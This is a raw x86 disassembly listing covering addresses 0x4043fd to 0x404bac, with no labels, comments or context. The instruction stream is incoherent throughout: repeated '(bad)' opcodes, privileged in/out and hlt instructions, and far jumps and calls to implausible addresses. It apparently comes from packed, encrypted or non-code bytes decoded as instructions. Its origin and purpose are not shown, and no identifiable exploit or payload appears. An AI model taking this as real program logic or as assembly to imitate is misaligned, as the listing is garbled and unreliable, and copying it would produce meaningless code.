  4043fd:	push   ecx
  4043fe:	call   0x9f11bc69
  404403:	sahf   
  404404:	js     0x404387
  404406:	mov    esp,0x3edd84bb
  40440b:	and    esi,DWORD PTR [ebp-0x7f]
  40440e:	hlt    
  40440f:	adc    bl,BYTE PTR [ebx+ebp*8]
  404412:	push   ebp
  404413:	neg    BYTE PTR [esi-0x4de069c7]
  404419:	out    0x41,eax
  40441b:	cdq    
  40441c:	cmp    eax,0x5c7b7586
  404421:	xchg   ebp,eax
  404422:	xchg   ebp,eax
  404423:	add    ah,BYTE PTR [edx-0x25296c28]
  404429:	adc    ecx,edx
  40442b:	lods   eax,DWORD PTR ds:[esi]
  40442c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40442d:	enter  0xee03,0xfa
  404431:	shl    DWORD PTR [esi+0x69],1
  404434:	inc    esi
  404435:	pop    ds
  404436:	out    dx,eax
  404437:	jmp    0x8515fa79
  40443c:	fwait
  40443d:	das    
  40443e:	pop    edx
  40443f:	mov    ebx,0xc1d791f7
  404444:	in     eax,0x4f
  404446:	ret    
  404447:	jecxz  0x40449b
  404449:	push   esp
  40444a:	jl     0x404427
  40444c:	les    ecx,FWORD PTR [esi+0x3c03727b]
  404452:	loop   0x40442e
  404454:	ins    DWORD PTR es:[edi],dx
  404455:	jge    0x4043ee
  404457:	push   esi
  404458:	ins    BYTE PTR es:[edi],dx
  404459:	sub    edx,DWORD PTR [ebx+0x6a]
  40445c:	outs   dx,DWORD PTR ds:[esi]
  40445d:	es in  al,dx
  40445f:	(bad)  
  404460:	cmp    BYTE PTR [edi+ecx*8+0x9c9da4d],dh
  404467:	frstpm(287 only) 
  404469:	jecxz  0x4044c3
  40446b:	in     al,0x90
  40446d:	cdq    
  40446e:	push   ebp
  40446f:	and    eax,0x8ccebf5b
  404474:	repz mov bh,0xb2
  404477:	pop    es
  404478:	sub    BYTE PTR [esi+edx*4+0x68],dl
  40447c:	push   0xffffffe7
  40447e:	int    0xc4
  404480:	jne    0x40447c
  404482:	lahf   
  404483:	pop    edi
  404484:	xor    eax,0x6fe1c058
  404489:	pop    ecx
  40448a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40448b:	addr16 xor al,0x2b
  40448e:	or     esi,edi
  404490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404491:	dec    ebp
  404492:	rcl    DWORD PTR [esi-0x46],1
  404495:	mov    edi,ebp
  404497:	mov    cl,0xbb
  404499:	xchg   esp,eax
  40449a:	dec    esp
  40449b:	and    dl,BYTE PTR [ecx+0x8]
  40449e:	sti    
  40449f:	fist   WORD PTR [edx-0x1878c670]
  4044a5:	mov    ch,0xa6
  4044a7:	cmp    dh,al
  4044a9:	out    0x91,al
  4044ab:	sub    eax,0x594fd9f3
  4044b0:	pop    ds
  4044b1:	fldcw  WORD PTR [edx+0x2]
  4044b4:	push   ebx
  4044b5:	sub    al,0x9b
  4044b7:	push   ebx
  4044b8:	mov    esp,0x35376879
  4044bd:	ins    DWORD PTR es:[edi],dx
  4044be:	int3   
  4044bf:	xchg   esi,eax
  4044c0:	mov    eax,ds:0x1c7377ec
  4044c5:	aaa    
  4044c6:	lahf   
  4044c7:	iret   
  4044c8:	pushf  
  4044c9:	push   edi
  4044ca:	push   ebp
  4044cb:	or     BYTE PTR [eax+0x72],ch
  4044ce:	or     DWORD PTR [eax],0x15
  4044d1:	cmp    al,0x29
  4044d3:	push   es
  4044d4:	add    bh,dh
  4044d6:	push   esi
  4044d7:	sar    edi,cl
  4044d9:	out    dx,eax
  4044da:	push   esp
  4044db:	mov    eax,ds:0x9e92620f
  4044e0:	and    dl,BYTE PTR [ecx+0x23d00fdf]
  4044e6:	mov    dh,0x28
  4044e8:	mov    dh,0xdd
  4044ea:	jmp    0x90f0:0xa8260fa
  4044f1:	mov    BYTE PTR [ebx-0x27],dl
  4044f4:	cs cmpxchg ebp,eax
  4044f8:	push   ebx
  4044f9:	pusha  
  4044fa:	adc    al,0x5c
  4044fc:	adc    eax,0x61f44f62
  404501:	jb     0x40456a
  404503:	sub    esi,edx
  404505:	jmp    0x40449c
  404507:	std    
  404508:	cdq    
  404509:	push   0x44
  40450b:	xor    ah,BYTE PTR [ecx]
  40450d:	push   ds
  40450e:	in     ax,dx
  404510:	dec    edx
  404511:	dec    eax
  404512:	adc    esp,DWORD PTR [edx]
  404514:	pop    ds
  404515:	repnz cs rcr cl,cl
  404519:	pop    ds
  40451a:	mov    eax,ds:0x7b805663
  40451f:	test   BYTE PTR [edi+0x3d41fb04],ah
  404525:	sub    esp,DWORD PTR [edx]
  404527:	jbe    0x4045a8
  404529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40452a:	cwde   
  40452b:	xor    eax,0xfc0938fc
  404530:	pushf  
  404531:	xor    DWORD PTR [edi],ecx
  404533:	mov    eax,0xf880f997
  404538:	add    BYTE PTR [ecx-0x74157859],0x1f
  40453f:	arpl   WORD PTR [ebx-0x2d],sp
  404542:	jo     0x404551
  404544:	or     al,0x38
  404546:	rcl    BYTE PTR [ebp+0x24],cl
  404549:	mov    eax,ds:0x225f5050
  40454e:	or     al,0x2
  404550:	aas    
  404551:	es mov ebx,0xc864bb25
  404557:	aas    
  404558:	jae    0x404534
  40455a:	fisubr WORD PTR [ebx]
  40455c:	cld    
  40455d:	nop
  40455e:	mov    dh,ah
  404560:	sbb    DWORD PTR [ebx],0xf3baa813
  404566:	inc    esp
  404567:	mov    ds:0x67365710,eax
  40456c:	jb     0x4045dd
  40456e:	stos   DWORD PTR es:[edi],eax
  40456f:	xchg   edx,eax
  404570:	in     al,dx
  404571:	xor    esp,DWORD PTR [ebp-0x7c]
  404574:	div    DWORD PTR [ecx-0x2e]
  404577:	out    0xf4,eax
  404579:	into   
  40457a:	ret    0xcd80
  40457d:	and    edi,ebx
  40457f:	outs   dx,BYTE PTR ds:[esi]
  404580:	adc    eax,0x9c422da8
  404585:	jle    0x4045c4
  404587:	out    dx,al
  404588:	or     al,BYTE PTR [edx]
  40458a:	in     al,dx
  40458b:	ficomp WORD PTR [ebp-0x4b]
  40458e:	mov    ebx,0x3fe375f8
  404593:	mov    BYTE PTR ds:0x232d7d1d,al
  404599:	xor    al,0x89
  40459b:	jbe    0x40452a
  40459d:	movhps QWORD PTR [ebp-0x49],xmm2
  4045a1:	mov    esp,0x72aa52c8
  4045a6:	add    BYTE PTR [ebx+0x3287c581],bl
  4045ac:	jo     0x404561
  4045ae:	xchg   ebx,eax
  4045af:	mov    cl,0xdc
  4045b1:	adc    DWORD PTR [ecx-0x2d],ebp
  4045b4:	add    ah,cl
  4045b6:	push   es
  4045b7:	xchg   edi,eax
  4045b8:	mov    ds:0x8d2b6d5f,al
  4045bd:	inc    ebp
  4045be:	retf   
  4045bf:	and    ecx,DWORD PTR [ebx]
  4045c1:	mov    dh,0xab
  4045c3:	cmp    ch,BYTE PTR [ecx-0x4f]
  4045c6:	mov    ds:0x4daa88f5,al
  4045cb:	ins    DWORD PTR es:[edi],dx
  4045cc:	pop    esi
  4045cd:	xor    BYTE PTR [ecx+ebp*8+0x40],dl
  4045d1:	fwait
  4045d2:	jne    0x4045d4
  4045d4:	ja     0x4045eb
  4045d6:	stos   BYTE PTR es:[edi],al
  4045d7:	mov    bh,0xed
  4045d9:	jb     0x404616
  4045db:	(bad)
  4045df:	xchg   edi,esp
  4045e1:	jno    0x404611
  4045e3:	in     eax,dx
  4045e4:	in     eax,dx
  4045e5:	outs   dx,BYTE PTR ds:[esi]
  4045e6:	push   ecx
  4045e7:	adc    DWORD PTR [ebx],esp
  4045e9:	fist   DWORD PTR [eax]
  4045eb:	ins    BYTE PTR es:[edi],dx
  4045ec:	dec    edx
  4045ed:	xchg   ebp,eax
  4045ee:	aam    0xb8
  4045f0:	mov    BYTE PTR [edx-0x32605e1a],ah
  4045f6:	push   edi
  4045f7:	sar    DWORD PTR [eax],0x1c
  4045fa:	(bad)  
  4045fb:	nop
  4045fc:	lahf   
  4045fd:	sub    al,0xa7
  4045ff:	test   ecx,0x83b0f5ee
  404605:	and    eax,0x5122763e
  40460a:	fiadd  WORD PTR [eax+ebx*1+0x1e]
  40460e:	loop   0x4045d8
  404610:	icebp  
  404611:	(bad)  [edi+0x28]
  404614:	cmp    ah,BYTE PTR [ebx-0x5bd108de]
  40461a:	inc    ebp
  40461b:	or     BYTE PTR [ecx-0x61],0x48
  40461f:	inc    ecx
  404620:	sub    BYTE PTR [ebx+0x25],dh
  404623:	imul   ecx,DWORD PTR [ebx+0x74],0xcaa0fe54
  40462a:	inc    eax
  40462b:	in     al,0x0
  40462d:	push   ds
  40462e:	mov    esi,0x750f74b3
  404633:	and    DWORD PTR [ebx],0xffffff97
  404636:	ss inc edi
  404638:	scas   al,BYTE PTR es:[edi]
  404639:	in     eax,0x95
  40463b:	inc    edi
  40463c:	ret    0xe8fe
  40463f:	sbb    DWORD PTR [eax],0x8
  404642:	and    edx,DWORD PTR [esi+0x11]
  404645:	push   eax
  404646:	xor    esp,0x7b8a9283
  40464c:	sar    DWORD PTR [edi+0x26],0x36
  404650:	aas    
  404651:	sub    eax,0x732b71bf
  404656:	inc    ebp
  404657:	shl    BYTE PTR [edx+0x58fc30fc],0xb3
  40465e:	clc    
  40465f:	xor    eax,0x8d928b9b
  404664:	inc    esi
  404665:	dec    esi
  404666:	sahf   
  404667:	jmp    0xa0446a61
  40466c:	js     0x404638
  40466e:	sub    eax,0x25c29e39
  404673:	mov    ebp,0x3736fe80
  404678:	in     al,0xf1
  40467a:	test   eax,0x6b6feb2
  40467f:	and    esp,DWORD PTR [ecx-0x4b13bf14]
  404685:	adc    ch,BYTE PTR [esi+0x61]
  404688:	jno    0x4046d0
  40468a:	xchg   esi,eax
  40468b:	sti    
  40468c:	aam    0xc8
  40468e:	and    cl,BYTE PTR [eax+0x1a]
  404691:	cmp    BYTE PTR [edx+0x654a7827],bl
  404697:	pop    ebx
  404698:	or     esi,DWORD PTR ds:[esi]
  40469b:	add    ch,bh
  40469d:	and    DWORD PTR [ebp-0x35],0xffffffb0
  4046a1:	and    ebx,DWORD PTR [ecx]
  4046a3:	aas    
  4046a4:	cmp    al,0xcd
  4046a6:	fsubr  st,st(5)
  4046a8:	jp     0x4046db
  4046aa:	and    BYTE PTR [ecx],al
  4046ac:	jnp    0x4046aa
  4046ae:	ss add ebx,esp
  4046b1:	clc    
  4046b2:	pop    edx
  4046b3:	std    
  4046b4:	dec    eax
  4046b5:	sbb    BYTE PTR [ebp+0x1a],ch
  4046b8:	mov    al,ds:0x9d626a23
  4046bd:	ja     0x4046ef
  4046bf:	aam    0xda
  4046c1:	faddp  st(4),st
  4046c3:	pop    ecx
  4046c4:	pop    edx
  4046c5:	rcr    BYTE PTR [edx+edx*2-0x4a],cl
  4046c9:	adc    eax,0x6961f1e3
  4046ce:	in     eax,0xdb
  4046d0:	inc    ebp
  4046d1:	mov    edi,0xdb07c774
  4046d6:	mov    ebx,edx
  4046d8:	les    esi,FWORD PTR [ebp+0x68]
  4046db:	mov    esi,0x3edbe215
  4046e0:	mov    WORD PTR [eax+0x79905f77],ss
  4046e6:	xor    DWORD PTR [ebp+ecx*1-0x51],0x3e923a2d
  4046ee:	push   edi
  4046ef:	dec    edi
  4046f0:	out    dx,al
  4046f1:	rcpps  xmm0,xmm2
  4046f4:	mov    bh,0x76
  4046f6:	test   BYTE PTR [ecx-0x40],dl
  4046f9:	push   ebp
  4046fa:	xor    al,BYTE PTR [ecx-0x65cfeb77]
  404700:	call   0x9fc:0x29289f45
  404707:	div    BYTE PTR ds:0x24e589ed
  40470d:	xchg   esp,eax
  40470e:	fld    QWORD PTR [ecx-0x359be83c]
  404714:	sub    al,0xfb
  404716:	sub    esp,edx
  404718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404719:	ss push esp
  40471b:	mov    cl,BYTE PTR [edx-0x6f6d230e]
  404721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404722:	or     eax,0x6eb15935
  404727:	loopne 0x40478a
  404729:	mov    BYTE PTR ds:0xa1830912,ah
  40472f:	mov    eax,0x9c9bfa20
  404734:	jl     0x40472d
  404736:	adc    eax,edx
  404738:	jbe    0x4046bb
  40473a:	lods   al,BYTE PTR ds:[esi]
  40473b:	jae    0x4046dd
  40473d:	fild   DWORD PTR [ecx-0x39]
  404740:	xor    dl,BYTE PTR [ebx+0x19]
  404743:	call   0x2b8e:0xdd61a58f
  40474a:	pushf  
  40474b:	jns    0x404778
  40474d:	ffree  st(6)
  40474f:	pop    ecx
  404750:	dec    ebx
  404751:	retf   0x1619
  404754:	mov    ah,0xd6
  404756:	cmp    DWORD PTR [ecx-0x5a5e0928],edx
  40475c:	mov    ch,0xa3
  40475e:	cmp    DWORD PTR [esi+0x78d01263],edi
  404764:	neg    ebx
  404766:	jge    0x404750
  404768:	cmp    ebx,DWORD PTR [esi+0x54]
  40476b:	mov    dl,dh
  40476d:	cmp    eax,0x24c0c081
  404772:	mov    ds:0x14e32c83,eax
  404777:	lea    edx,[edx]
  404779:	jae    0x4047a9
  40477b:	pusha  
  40477c:	nop
  40477d:	cwde   
  40477e:	mov    BYTE PTR [ebx-0x1013919],0x5b
  404785:	sbb    dh,BYTE PTR [esi+0xb]
  404788:	pop    esi
  404789:	mov    dl,0x87
  40478b:	aad    0xaa
  40478d:	jmp    0x4047fd
  40478f:	add    dl,bh
  404791:	xor    bl,0x32
  404794:	push   ds
  404795:	xor    al,0x18
  404797:	xchg   ebp,eax
  404798:	out    0xae,eax
  40479a:	lahf   
  40479b:	jnp    0x4047f7
  40479d:	pop    ds
  40479e:	outs   dx,DWORD PTR ds:[esi]
  40479f:	fisub  DWORD PTR [edx+0x5c72551d]
  4047a5:	icebp  
  4047a6:	cmp    al,0x8f
  4047a8:	cs dec edi
  4047aa:	cdq    
  4047ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ac:	jl     0x601b0565
  4047b2:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047b4:	mov    ebx,0x997ed76c
  4047b9:	pushf  
  4047ba:	(bad)  
  4047bb:	push   ds
  4047bc:	inc    ebx
  4047bd:	jg     0x4047d0
  4047bf:	dec    edx
  4047c0:	adc    BYTE PTR [edx+0x56bb2a5a],bl
  4047c6:	push   ecx
  4047c7:	mov    dh,0x19
  4047c9:	ss call 0x2a2c4085
  4047cf:	(bad)  
  4047d0:	jbe    0x4047ef
  4047d2:	cmp    DWORD PTR [ebx],0xa8944607
  4047d8:	xor    edi,DWORD PTR [esi+0x58]
  4047db:	or     ah,BYTE PTR [ecx-0x3a]
  4047de:	scas   al,BYTE PTR es:[edi]
  4047df:	ret    0x7cb0
  4047e2:	call   0xd66a:0xc523ee1a
  4047e9:	jge    0x404817
  4047eb:	inc    edx
  4047ec:	or     al,0xe0
  4047ee:	mov    ebp,0x1f52a4f
  4047f3:	fild   DWORD PTR [ecx]
  4047f5:	ss fcomi st,st(6)
  4047f8:	dec    ebp
  4047f9:	outs   dx,DWORD PTR ds:[esi]
  4047fa:	and    BYTE PTR [edi-0x63],cl
  4047fd:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4047ff:	scas   al,BYTE PTR es:[edi]
  404800:	call   0xcc81:0x6192e139
  404807:	popa   
  404808:	jbe    0x404884
  40480a:	pop    es
  40480b:	rol    ch,0xdf
  40480e:	mov    gs,WORD PTR [ecx-0x71114381]
  404814:	aam    0x14
  404816:	push   0x812d6b22
  40481b:	pop    esi
  40481c:	mov    esi,0xaa0312e2
  404821:	or     BYTE PTR [ebp+esi*8-0x7464452f],bh
  404828:	jle    0x4048a7
  40482a:	test   DWORD PTR [edx+0xf],esi
  40482d:	aas    
  40482e:	js     0x4047c7
  404830:	adc    eax,0xf20b242c
  404835:	xchg   bl,bl
  404837:	test   DWORD PTR [ecx+0x76a9c2d3],edi
  40483d:	mov    esi,ecx
  40483f:	push   ebp
  404840:	mov    bh,0x55
  404842:	push   edx
  404843:	mov    bh,0x9d
  404845:	pop    ds
  404846:	inc    eax
  404847:	push   edi
  404848:	pop    ss
  404849:	bound  ecx,QWORD PTR ds:0x75334252
  40484f:	fidivr WORD PTR [eax+ecx*8]
  404852:	xchg   esi,eax
  404853:	cwde   
  404854:	pop    esi
  404855:	pop    ecx
  404856:	imul   edx,DWORD PTR [eax+0x39],0x6a
  40485a:	jnp    0x4047ed
  40485c:	les    ebx,FWORD PTR [ecx]
  40485e:	std    
  40485f:	in     al,0xf1
  404861:	sbb    ah,0x84
  404864:	(bad)  
  404865:	pusha  
  404866:	or     al,BYTE PTR [esi-0x355960c9]
  40486c:	jne    0x4047ff
  40486e:	and    ebx,esi
  404870:	adc    bh,al
  404872:	out    dx,eax
  404873:	fdiv   QWORD PTR [edx+0x5dbd9864]
  404879:	(bad)  
  40487a:	jbe    0x404825
  40487c:	and    cl,BYTE PTR ss:[ebp-0x36a0b012]
  404883:	cmovp  ebx,DWORD PTR [ecx]
  404886:	sti    
  404887:	cmp    eax,eax
  404889:	lods   eax,DWORD PTR ds:[esi]
  40488a:	jp     0x404889
  40488c:	aaa    
  40488d:	gs aad 0x99
  404890:	mov    WORD PTR [edx],?
  404892:	aaa    
  404893:	lods   al,BYTE PTR ds:[esi]
  404894:	inc    edx
  404895:	out    0x12,eax
  404897:	push   eax
  404898:	retf   0x1f41
  40489b:	int3   
  40489c:	cmp    BYTE PTR [ebx],dl
  40489e:	cmp    BYTE PTR ds:0xe5728e60,dl
  4048a4:	(bad)  
  4048a5:	ret    0xc0ec
  4048a8:	xor    ecx,DWORD PTR [edi+0x28]
  4048ab:	into   
  4048ac:	das    
  4048ad:	mov    eax,0xa10404f3
  4048b2:	jae    0x4048fd
  4048b4:	jmp    0x404864
  4048b6:	adc    bl,BYTE PTR [ebp-0x16]
  4048b9:	cmp    esi,DWORD PTR [edx]
  4048bb:	idiv   DWORD PTR [ebp+0x44aaf771]
  4048c1:	push   ecx
  4048c2:	and    al,0x56
  4048c4:	pop    eax
  4048c5:	and    edi,DWORD PTR [edi]
  4048c7:	cwde   
  4048c8:	int3   
  4048c9:	shl    dh,cl
  4048cb:	data16 adc cl,BYTE PTR [ebx]
  4048ce:	sub    BYTE PTR [esp+eax*1+0x77802c80],cl
  4048d5:	loope  0x40486d
  4048d7:	mov    ch,0xb9
  4048d9:	dec    edi
  4048da:	lods   al,BYTE PTR ds:[esi]
  4048db:	not    DWORD PTR ds:0x7d7e8eb0
  4048e1:	pushf  
  4048e2:	out    0x7e,eax
  4048e4:	pop    esp
  4048e5:	sbb    esp,ebx
  4048e7:	mov    ebp,cs
  4048e9:	jbe    0x404920
  4048eb:	imul   ebp,DWORD PTR [edx-0x5d],0xe
  4048ef:	cli    
  4048f0:	mov    ?,ebp
  4048f2:	retf   0x369f
  4048f5:	dec    esi
  4048f6:	dec    eax
  4048f7:	(bad)  
  4048f8:	jp     0x404886
  4048fa:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048fc:	leave  
  4048fd:	stos   BYTE PTR es:[edi],al
  4048fe:	cld    
  4048ff:	int    0x1a
  404901:	(bad)  [eax+0x61a609a5]
  404907:	cld    
  404908:	jmp    0xb8a8b16f
  40490d:	fwait
  40490e:	xchg   DWORD PTR [ebx-0x55568068],ebp
  404914:	fdivr  DWORD PTR [ebx]
  404916:	and    eax,0xef8a5c4b
  40491b:	nop
  40491c:	mov    WORD PTR [edx-0x17],ds
  40491f:	vpackuswb xmm0,xmm3,XMMWORD PTR [eax]
  404923:	popa   
  404924:	fadd   DWORD PTR [esi+0x48]
  404927:	ds dec edx
  404929:	mov    al,ds:0x64513684
  40492e:	pop    ebp
  40492f:	into   
  404930:	adc    BYTE PTR [ebp+0x324979bb],ah
  404936:	mov    ecx,0xee3ac629
  40493b:	fcom   QWORD PTR [ecx-0x13]
  40493e:	push   esp
  40493f:	and    eax,0x7ccd2f5e
  404944:	mov    DWORD PTR [edx-0x40],eax
  404947:	pop    esp
  404948:	push   ds
  404949:	dec    esp
  40494a:	pop    edi
  40494b:	xchg   esp,eax
  40494c:	idiv   DWORD PTR [edi-0x34]
  40494f:	push   ecx
  404950:	pop    ecx
  404951:	push   ebx
  404952:	pop    esi
  404953:	adc    eax,edx
  404955:	cmp    BYTE PTR [eax-0x17],al
  404958:	pushf  
  404959:	fs inc esp
  40495b:	sar    BYTE PTR [esi-0x2f],0x65
  40495f:	adc    BYTE PTR [eax+0x7402a87c],dl
  404965:	jl     0x4048fb
  404967:	jns    0x404992
  404969:	mov    ?,WORD PTR [esi-0x6bdb35d0]
  40496f:	bound  esi,QWORD PTR [eax-0x54]
  404972:	icebp  
  404973:	inc    ecx
  404974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404975:	(bad)  ds:0xe9a8fbcf
  40497b:	and    eax,0x10cc503f
  404980:	inc    eax
  404981:	inc    edx
  404982:	lds    eax,FWORD PTR [esi+0x59cb295]
  404988:	xchg   edx,eax
  404989:	mov    bl,BYTE PTR [edi+0x56abb774]
  40498f:	retf   0xdb50
  404992:	aas    
  404993:	xlat   BYTE PTR ds:[ebx]
  404994:	fwait
  404995:	xchg   ebp,eax
  404996:	shr    DWORD PTR [ebx-0x6a],0x8d
  40499a:	jg     0x40495d
  40499c:	push   edx
  40499d:	arpl   WORD PTR [edx],sp
  40499f:	push   ebx
  4049a0:	dec    eax
  4049a1:	push   DWORD PTR ds:0x4d78bc46
  4049a7:	fdivr  QWORD PTR [ecx+0x11dd48a1]
  4049ad:	xchg   BYTE PTR ds:0x880f9be3,dh
  4049b3:	jecxz  0x40495e
  4049b5:	mov    bl,0x52
  4049b7:	enter  0x555c,0xda
  4049bb:	bound  ecx,QWORD PTR [ebx]
  4049bd:	popa   
  4049be:	jge    0x404968
  4049c0:	mov    al,ds:0xd7057308
  4049c5:	sub    ecx,DWORD PTR [ebx-0x400d5d09]
  4049cb:	in     eax,dx
  4049cc:	xlat   BYTE PTR ds:[ebx]
  4049cd:	into   
  4049ce:	das    
  4049cf:	ins    DWORD PTR es:[edi],dx
  4049d0:	mov    gs,WORD PTR [edx]
  4049d2:	mov    esi,0x9652138b
  4049d7:	pop    ecx
  4049d8:	lds    ebx,FWORD PTR [edi]
  4049da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049db:	test   al,0x3b
  4049dd:	adc    eax,0x1adc4b9c
  4049e2:	fwait
  4049e3:	dec    eax
  4049e4:	add    bh,BYTE PTR [eax]
  4049e6:	mov    cl,0x27
  4049e8:	sbb    bh,0x64
  4049eb:	mov    edi,0x19bbe63b
  4049f0:	jne    0x404a22
  4049f2:	adc    eax,0x1c08de77
  4049f7:	mov    edi,0x1089ced3
  4049fc:	das    
  4049fd:	xlat   BYTE PTR ds:[ebx]
  4049fe:	inc    edx
  4049ff:	ret    0xf15d
  404a02:	mov    ecx,0x54fd24b
  404a07:	les    eax,FWORD PTR [ecx]
  404a09:	into   
  404a0a:	sti    
  404a0b:	popf   
  404a0c:	xor    al,0x45
  404a0e:	adc    ebx,DWORD PTR [esi+0x2]
  404a11:	add    edi,DWORD PTR [ebx+0x60]
  404a14:	dec    edx
  404a15:	mov    bl,0x4b
  404a17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a18:	and    al,0xb0
  404a1a:	cmp    BYTE PTR [edi-0x521232c1],bl
  404a20:	test   al,0x9d
  404a22:	ja     0x404a89
  404a24:	cmc    
  404a25:	sub    eax,0xb6746fc3
  404a2a:	test   eax,0xc3f1385e
  404a2f:	dec    esi
  404a30:	fs iret 
  404a32:	lock mov ds:0x3640402a,eax
  404a38:	push   0x96f65a28
  404a3d:	xor    dl,BYTE PTR [edx+edi*4+0x36]
  404a41:	inc    eax
  404a42:	or     BYTE PTR [edi],cl
  404a44:	inc    esi
  404a45:	sbb    BYTE PTR [edx-0x5a07e7ef],ch
  404a4b:	test   BYTE PTR [esi],bh
  404a4d:	mov    al,0x99
  404a4f:	rcr    ecx,cl
  404a51:	js     0x404a08
  404a53:	xchg   DWORD PTR [esi+0x56f592b5],ebx
  404a59:	mov    esi,0xea911835
  404a5e:	repnz std 
  404a60:	(bad)  [ebp+0x14]
  404a63:	push   ds
  404a64:	push   esi
  404a65:	imul   esp,DWORD PTR [edx-0xb9617c],0x417ed1a1
  404a6f:	add    eax,0xca101674
  404a74:	inc    edi
  404a75:	scas   eax,DWORD PTR es:[edi]
  404a76:	ret    
  404a77:	sti    
  404a78:	add    esi,edx
  404a7a:	inc    esp
  404a7b:	ins    BYTE PTR es:[edi],dx
  404a7c:	pop    ecx
  404a7d:	jbe    0x404a6b
  404a7f:	sub    al,0x95
  404a81:	ror    DWORD PTR [edx+0x10],0x87
  404a85:	nop
  404a86:	fsub   QWORD PTR [ebx]
  404a88:	dec    esi
  404a89:	and    ah,al
  404a8b:	mov    ch,0x19
  404a8d:	neg    DWORD PTR [eax+0x1968f156]
  404a93:	pop    esi
  404a94:	mov    ebp,0x9c9a7fed
  404a99:	je     0x404add
  404a9b:	dec    edi
  404a9c:	mov    eax,ds:0x3b98ce77
  404aa1:	push   ebp
  404aa2:	in     eax,dx
  404aa3:	mov    DWORD PTR [ebx+0x4a3232f6],0xa654f0b8
  404aad:	xchg   esi,eax
  404aae:	aaa    
  404aaf:	and    DWORD PTR [edi-0x20],edi
  404ab2:	test   ebx,eax
  404ab4:	cdq    
  404ab5:	mov    eax,ds:0x603b631b
  404aba:	or     bh,bl
  404abc:	adc    al,0x2a
  404abe:	fwait
  404abf:	adc    BYTE PTR [ecx+0x78],bl
  404ac2:	inc    esi
  404ac3:	push   ebx
  404ac4:	dec    esi
  404ac5:	int    0x9a
  404ac7:	sti    
  404ac8:	and    cl,BYTE PTR [edx]
  404aca:	pop    esi
  404acb:	addr16 inc esi
  404acd:	or     al,0x14
  404acf:	push   ebx
  404ad0:	(bad)  
  404ad3:	mov    ch,0x7d
  404ad5:	cs xor al,0x5f
  404ad8:	imul   eax,DWORD PTR [eax],0xa140082b
  404ade:	shl    BYTE PTR [eax+edi*8],cl
  404ae1:	sub    esi,DWORD PTR [eax]
  404ae3:	out    0x90,al
  404ae5:	data16 repz out dx,al
  404ae8:	add    dh,BYTE PTR [esi]
  404aea:	gs out 0x5e,al
  404aed:	fcomp  DWORD PTR [edx]
  404aef:	push   ebp
  404af0:	int3   
  404af1:	int    0x0
  404af3:	fcom   DWORD PTR fs:[ecx+0xa]
  404af7:	sub    BYTE PTR [edi-0x48],0x43
  404afb:	jne    0x404ad5
  404afd:	pop    ss
  404afe:	sub    BYTE PTR [edx],ah
  404b00:	outs   dx,DWORD PTR ds:[esi]
  404b01:	mov    ss,WORD PTR [ebx]
  404b03:	(bad)  
  404b05:	add    DWORD PTR [ebx-0x769759fd],edi
  404b0b:	push   ebp
  404b0c:	push   di
  404b0e:	stc    
  404b0f:	in     eax,dx
  404b10:	push   esp
  404b11:	mov    cl,0xb4
  404b13:	dec    esi
  404b14:	mov    ah,0x9f
  404b16:	add    edx,DWORD PTR [esi]
  404b18:	das    
  404b19:	mov    cl,0x18
  404b1b:	adc    dh,al
  404b1d:	sahf   
  404b1e:	pop    ebx
  404b1f:	xchg   bl,ch
  404b21:	cmp    DWORD PTR [eax+0x26778688],edx
  404b27:	or     al,0xf5
  404b29:	(bad)  
  404b2b:	imul   eax,DWORD PTR [ecx],0x83a13b8c
  404b31:	mov    esp,0x8a04097a
  404b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b37:	stc    
  404b38:	out    dx,eax
  404b39:	xor    DWORD PTR [eax+0x5930c0cb],0xd9aad19a
  404b43:	inc    esp
  404b44:	cmp    al,0x3c
  404b46:	dec    esi
  404b47:	aam    0x30
  404b49:	aaa    
  404b4a:	pop    esp
  404b4b:	dec    BYTE PTR [edi-0x5e]
  404b4e:	push   edx
  404b4f:	cmp    al,ch
  404b51:	in     al,dx
  404b52:	xchg   ebp,eax
  404b53:	dec    edi
  404b54:	xor    esi,DWORD PTR [edi+edx*2-0x73]
  404b58:	pop    ecx
  404b59:	xchg   ecx,eax
  404b5a:	addr16 inc ebp
  404b5c:	outs   dx,DWORD PTR ds:[esi]
  404b5d:	jecxz  0x404b9a
  404b5f:	pop    ebp
  404b60:	leave  
  404b61:	mov    ebx,0xe3444c8b
  404b66:	dec    esp
  404b67:	xchg   ecx,eax
  404b68:	mov    bh,0x85
  404b6a:	loope  0x404b69
  404b6c:	loope  0x404b3a
  404b6e:	outs   dx,BYTE PTR ds:[esi]
  404b6f:	repz lds eax,FWORD PTR [eax+0x2a1cf80f]
  404b76:	in     al,0xc8
  404b78:	xor    eax,0xeb28d24b
  404b7d:	inc    esp
  404b7e:	pop    ecx
  404b7f:	int    0x31
  404b81:	std    
  404b82:	push   edx
  404b83:	xchg   ebx,eax
  404b84:	pop    ecx
  404b85:	fs xchg esp,eax
  404b87:	cmp    al,0xbf
  404b89:	scas   eax,DWORD PTR es:[edi]
  404b8a:	clc    
  404b8b:	lods   al,BYTE PTR ds:[esi]
  404b8c:	enter  0x1d13,0x81
  404b90:	or     ch,BYTE PTR [edx-0x26]
  404b93:	dec    ecx
  404b94:	fisubr WORD PTR [edx+eax*4-0x6b]
  404b98:	rcr    DWORD PTR [ebx+0x20],cl
  404b9b:	adc    ebp,ecx
  404b9d:	pop    esp
  404b9e:	xor    BYTE PTR [ecx],ch
  404ba0:	cld    
  404ba1:	cmc    
  404ba2:	adc    ah,BYTE PTR [ecx+0x31]
  404ba5:	jp     0x404bb5
  404ba7:	sub    esi,DWORD PTR [ecx]
  404ba9:	cs adc ebx,ebp
  404bac:	outs   dx,BYTE PTR ds:[esi]
